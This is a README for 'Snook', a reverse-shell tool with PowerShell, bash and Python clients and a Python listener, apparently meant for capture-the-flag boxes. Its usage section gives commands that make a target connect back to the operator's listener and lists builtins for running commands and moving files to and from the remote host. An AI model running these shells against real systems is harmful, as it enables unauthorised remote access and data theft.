# Snook

Enhanced PowerShell/bash/Python reverse shell with python listener. This work was inspired by [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and [Nishang's PowerShell reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
This is a cool tool for CTF boxes as the reverse shells are coded in a scripting language that will surely be available on the boxes, therefore they won't be dependency problems.
Feel free to suggest or implement new builtin commands!

## Dependencies

The python listener needs:

- alive-progress
- colorama
- cryptography

They all can be installed with pip.

The Powershell reverse shell has only been tested on PowerShell 5.1.
The bash reverse shell has only been tested on bash 5.0.16.
The Python reverse shell has only been tested with Python 2.7.18 and Python 3.8.3.

## Features

- Execute commands
- Download a file from the remote host
- Upload a file to the remote host
- Communication encryption (only available on the bash and PowerShell reverse shells at the moment)
- Fully interactive mode (only available on the bash and Python reverse shells at the moment)

## Usage

On your machine, set up the listener:

`python3 snook_listener.py -H <IP> -p <PORT>`

Then run the reverse shell on the remote machine:

`. .\snook.ps1 ; Invoke-Snook <IP> <PORT>` (on Windows)

or

`./snook.sh <IP> <PORT>` (on Linux)

or

`python snook.py -H <IP> -p <PORT>` (on Linux)

Then on the listener, type whatever command you want. Any command that is not a listener's builtin command will be interpreted as a Powershell/Bash command.

Here is a list of the special builtin commands available on the listener:

### Download

You can download a file from the remote host by typing `download -d <local_destination> <remote_file>`.
Cool tip: there is autocompletion on the local destination parameter.

### Upload

You can upload a file on the remote host by typing `upload -d <remote_destination> <local_file>`.
Cool tip: there is autocompletion on the local file parameter.

### Interactive (only on the Bash and Python reverse shells for the moment)

Juste type `interactive` and you get a fully interactive tty shell, really useful if you need to run commands like sudo.

## TODO

- Better handling of encryption setup errors
- Implement fully interactive mode for the PS reverse shell
- Implement download/upload of directories
- Add a socks command
